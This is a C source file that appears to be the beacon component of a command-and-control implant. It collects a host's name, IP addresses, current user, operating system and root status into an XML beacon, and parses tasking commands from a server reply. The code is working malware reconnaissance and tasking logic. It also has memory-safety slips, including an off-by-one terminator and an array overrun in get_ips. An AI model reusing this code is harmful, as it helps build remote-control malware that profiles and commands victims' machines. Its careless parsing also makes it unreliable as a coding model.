#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <errno.h>
#include <sys/utsname.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <netdb.h>

#include "colors.h"
#include "beacon.h"
#include "utils.h"

//int ID = 0;

/************************** BEACON ******************************/

#define MAX_IP_ENTRY_SIZE 64

/**
 * Uses getifaddrs to create a list of the host's IPv4 addresses mapped to the.
 * respective interface name. Each mapping is represented by a string of format
 * "<IPv4 address>@<interface_name>", e.g. "10.0.0.1@eth0".
 *
 * The loopback address ("127.0.0.1") is discarded.
 *
 * Accepts a char* array that can contain up to max_addrs IPv4 addresses.
 *
 * Returns the number of IPv4 addresses found.
 */
static int get_ips(char *addrs[], size_t max_addrs)
{
	addrs[0] = NULL;
	struct ifaddrs *ifaddr, *ifa;
	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs");
		return 0;
	}

	int n, i = 0;
	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
		if (ifa->ifa_addr == NULL)
			continue;

		if (ifa->ifa_addr->sa_family == AF_INET) {	// only ipv4
			char host[NI_MAXHOST];
			int ret = getnameinfo(ifa->ifa_addr,
					      sizeof(struct sockaddr_in),
					      host, NI_MAXHOST,
					      NULL, 0, NI_NUMERICHOST);
			char *address = (ret == 0) ? host : "";
			if (strncmp(address, "127", 3) == 0)	// skip loopback addresses
				continue;

			char *entry = malloc(MAX_IP_ENTRY_SIZE);
			char *interface = ifa->ifa_name;
			sprintf(entry, "%s@%s", address, interface);
			addrs[i] = entry;
			i++;

			if (i > max_addrs)
				break;
		}
	}

	return i;
}

/**
 * Determines whether the given IPv4 address is internal by checking its first
 * two octets. See https://en.wikipedia.org/wiki/Reserved_IP_addresses for a list
 * of private IPv4 addresses.
 *
 * Returns 1 if address is internal, 0 otherwise.
 */
static int is_internal_ip(char *_addr)
{
	int priv = 0;

	/* Copy the IP address to a new buffer, because
	   strtok modifies its argument */
	char addr[16];
	char *at = strchr(_addr, '@');
	int addr_len = (int)(at - _addr);
	strncpy(addr, _addr, addr_len);
	addr[addr_len + 1] = '\0';

	/* Get the first two octets as ints */
	char *fp, *sp;
	fp = strtok(addr, ".");
	sp = strtok(NULL, ".");
	long f = strtol(fp, NULL, 10);
	long s = strtol(sp, NULL, 10);

	// check if IPv4 is private base on first two numbers
	if (f == 10 || f == 127 ||
	    (f == 100 && s >= 64 && s <= 127) ||
	    (f == 172 && s >= 16 && s <= 31) ||
	    (f == 169 && s == 254) || (f == 192 && s == 168))
		priv = 1;

	return priv;
}

#define BEACON_MAX_SIZE 2048
#define BEACON_FIELD_MAX_SIZE 128
#define MAX_IPS 100

char *get_beacon(void)
{
	char *beacon = malloc(BEACON_MAX_SIZE);
	if (beacon == NULL)
		return NULL;

	char *pos = beacon;
	pos = append_buff(pos, "<Beacon>\n");

	//pos = append_buff(pos, "\t<ID>%d</ID>\n", ID);
	pos = append_buff(pos, "\t<Type>HEY</Type>\n");

	char *hostname = malloc(BEACON_FIELD_MAX_SIZE);
	char *username = malloc(BEACON_FIELD_MAX_SIZE);
	char *os = malloc(BEACON_FIELD_MAX_SIZE);

	// Get hostname
	int r = gethostname(hostname, BEACON_FIELD_MAX_SIZE);
	if (r == -1) {
		fprintf(stderr, "gethostname: %s\n", strerror(errno));
		sprintf(hostname, "");
	}
	pos = append_buff(pos, "\t<HostName>%s</HostName>\n", hostname);

	// Get IPs
	char *ips[MAX_IPS];
	int n = get_ips(ips, MAX_IPS);
	int i;
	for (i = 0; i < n; i++) {
		if (is_internal_ip(ips[i])) {
			pos =
			    append_buff(pos,
					"\t<InternalIP>%s</InternalIP>\n",
					ips[i]);
		} else {
			pos =
			    append_buff(pos,
					"\t<ExternalIP>%s</ExternalIP>\n",
					ips[i]);
		}
	}

	// Get current user
	struct passwd *pw;
	uid_t euid = geteuid();
	pw = getpwuid(euid);
	if (pw) {
		sprintf(username, "%s", pw->pw_name);
	} else {
		fprintf(stderr, "getpwuid: %s\n", strerror(errno));
		sprintf(username, "");
	}
	pos = append_buff(pos, "\t<CurrentUser>%s</CurrentUser>\n", username);

	// Get OS
	struct utsname utsn;
	r = uname(&utsn);
	if (r == -1) {
		fprintf(stderr, "uname: %s\n", strerror(errno));
		sprintf(os, "");
	} else {
		sprintf(os, "%s %s %s", utsn.sysname, utsn.release, utsn.machine);	// release, version
	}
	pos = append_buff(pos, "\t<OS>%s</OS>\n", os);

	// Get Admin
	uid_t uid = getuid();
	char admin = (uid == 0 || euid == 0) ? 'Y' : 'N';
	pos = append_buff(pos, "\t<Admin>%c</Admin>\n", admin);
	pos = append_buff(pos, "</Beacon>\n", os);

	free(hostname);
	free(username);
	free(os);

	return beacon;
}

/*********************** BEACON RESPONSE ***************************/

#define MAX_ATTR_LEN 128

static char *get_attribute(const char *xml, const char *attr)
{
	char *name_start = strstr(xml, attr);
	size_t name_len = strlen(attr);
	char *value_start = name_start + name_len + 2;	// for '="'
	size_t value_len = 0;
	char *curr;
	for (curr = value_start; *curr != '"'; curr++)
		value_len++;

	char *value = malloc(value_len + 1);	// '\0'
	if (value == NULL) {
		printf("malloc\n");
		return NULL;
	}

	memcpy(value, value_start, value_len);
	value[value_len] = '\0';
	return value;
}

/* returns -1 if a system error occurred (malloc)
   return 0 if the tag wasn't found
   returns 1 if the tag was found
   */
static char *parse_command_from_xml(const char *xml, struct command *cmd)
{
	char *type;
	char *param;
	int id;

	char *pos;
	if ((pos = strstr(xml, "command id=\"")) == NULL) {
		printf("[*] No (further) command found\n");
		return NULL;
	}

	type = get_attribute(pos, "type");
	param = get_attribute(pos, "param");
	char *id_str = get_attribute(pos, "id");

	/* Should do some sanity checks... */
	cmd->id = (int)strtol(id_str, NULL, 10);
	free(id_str);
	cmd->type = type;
	cmd->param = param;

	return (pos + 1);
}

int get_commands(char *response, struct command **cmds)
{
	*cmds = NULL;
	int cmd_num = 0;

	if (response) {
		char *cmds_section;
		if ((cmds_section = strstr(response, "commands")) == NULL) {
			printf("[*] XML does not have a commands section\n");
			return cmd_num;
		}
		printf("[*] Commands section found\n");

		char *pos = cmds_section;
		struct command *last;
		while (1) {
			struct command *cmd = calloc(1, sizeof(struct command));

			printf("[*] Fetching (next) command...\n");
			if ((pos = parse_command_from_xml(pos, cmd)) == NULL)
				/* No command found, stop */
				break;

			printf("[*] Found command [%d] %s : %s\n",
			       cmd->id, cmd->type, cmd->param);

			if (*cmds == NULL) {
				*cmds = cmd;
			} else {
				last->next = cmd;
			}
			last = cmd;

			cmd_num++;
		}
	}

	return cmd_num;
}
